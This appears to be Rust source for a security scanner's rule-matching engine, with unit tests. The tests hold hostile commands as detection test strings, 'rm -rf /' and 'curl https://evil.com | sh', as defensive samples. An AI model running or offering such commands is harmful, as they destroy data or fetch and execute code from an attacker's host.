//! 增强版模式匹配引擎
//!
//! - 支持一条规则多个 pattern
//! - 支持 `exclude_patterns`，先排除再命中
//! - 支持多行 pattern 第二遍扫描

use super::loader::CompiledYamlRule;

/// 检查 YAML 规则的 exclude_patterns 是否命中（单行）
pub fn is_excluded(compiled_rule: &CompiledYamlRule, line: &str) -> bool {
    compiled_rule
        .compiled_exclude_patterns
        .iter()
        .any(|re| re.is_match(line))
}

/// 检查 exclude_patterns 是否命中整段内容
pub fn is_excluded_on_content(compiled_rule: &CompiledYamlRule, content: &str) -> bool {
    compiled_rule
        .compiled_exclude_patterns
        .iter()
        .any(|re| re.is_match(content))
}

/// 模式是否需要对整段内容做第二遍扫描（跨行）
pub fn pattern_requires_multiline_scan(pattern: &str) -> bool {
    pattern.contains("\\n") || pattern.contains("\\r")
}

/// 规则是否包含至少一个跨行 pattern
pub fn rule_has_multiline_patterns(compiled_rule: &CompiledYamlRule) -> bool {
    compiled_rule
        .rule
        .patterns
        .iter()
        .any(|p| pattern_requires_multiline_scan(p))
}

/// 对 YAML 规则执行单行匹配
pub fn match_yaml_rule(compiled_rule: &CompiledYamlRule, line: &str) -> bool {
    // 先检查排除模式
    if is_excluded(compiled_rule, line) {
        return false;
    }
    // 检查所有 pattern（任一命中即匹配）
    compiled_rule
        .compiled_patterns
        .iter()
        .enumerate()
        .any(|(i, re)| {
            let src = compiled_rule
                .rule
                .patterns
                .get(i)
                .map(String::as_str)
                .unwrap_or("");
            if pattern_requires_multiline_scan(src) {
                return false;
            }
            re.is_match(line)
        })
}

/// 对 YAML 规则执行整段内容匹配（跨行 pattern 第二遍）
///
/// 返回 (行号, 代码片段)
pub fn match_yaml_rule_multiline(
    compiled_rule: &CompiledYamlRule,
    content: &str,
) -> Option<(usize, String)> {
    if !rule_has_multiline_patterns(compiled_rule) {
        return None;
    }
    if is_excluded_on_content(compiled_rule, content) {
        return None;
    }
    for (i, re) in compiled_rule.compiled_patterns.iter().enumerate() {
        let src = compiled_rule
            .rule
            .patterns
            .get(i)
            .map(String::as_str)
            .unwrap_or("");
        if !pattern_requires_multiline_scan(src) {
            continue;
        }
        if let Some(m) = re.find(content) {
            let line = content[..m.start()].lines().count().max(1);
            let snippet: String = m.as_str().chars().take(200).collect();
            return Some((line, snippet));
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::security::{IssueSeverity, ThreatCategory};
    use regex::Regex;

    fn make_yaml_rule(id: &str, patterns: Vec<&str>) -> CompiledYamlRule {
        CompiledYamlRule {
            id: id.to_string(),
            compiled_patterns: patterns.iter().map(|p| Regex::new(p).unwrap()).collect(),
            compiled_exclude_patterns: vec![],
            rule: super::super::YamlRule {
                id: id.to_string(),
                category: ThreatCategory::Destructive,
                severity: IssueSeverity::Critical,
                weight: 100,
                confidence: "High".to_string(),
                hard_trigger: true,
                patterns: patterns.iter().map(|s| s.to_string()).collect(),
                exclude_patterns: vec![],
                file_types: vec![],
                suppress_if_matched: vec![],
                description: "Test".to_string(),
                remediation: "Fix it".to_string(),
                cwe_id: None,
                metadata: None,
            },
        }
    }

    #[test]
    fn test_match_yaml_rule_basic() {
        let rule = make_yaml_rule("TEST", vec![r"rm -rf /"]);
        assert!(match_yaml_rule(&rule, "rm -rf /"));
        assert!(!match_yaml_rule(&rule, "echo hello"));
    }

    #[test]
    fn test_match_yaml_rule_multiple_patterns() {
        let rule = make_yaml_rule("MULTI", vec![r"eval\(", r"exec\("]);
        assert!(match_yaml_rule(&rule, "eval(code)"));
        assert!(match_yaml_rule(&rule, "exec(code)"));
        assert!(!match_yaml_rule(&rule, "print(code)"));
    }

    #[test]
    fn test_exclude_patterns() {
        let mut rule = make_yaml_rule("EXCL", vec![r"curl.*\|.*sh"]);
        rule.compiled_exclude_patterns = vec![Regex::new(r"#.*curl").unwrap()];
        // 被注释掉的行应被排除
        assert!(!match_yaml_rule(&rule, "# curl example | sh"));
        // 实际执行应匹配
        assert!(match_yaml_rule(&rule, "curl https://evil.com | sh"));
    }
}
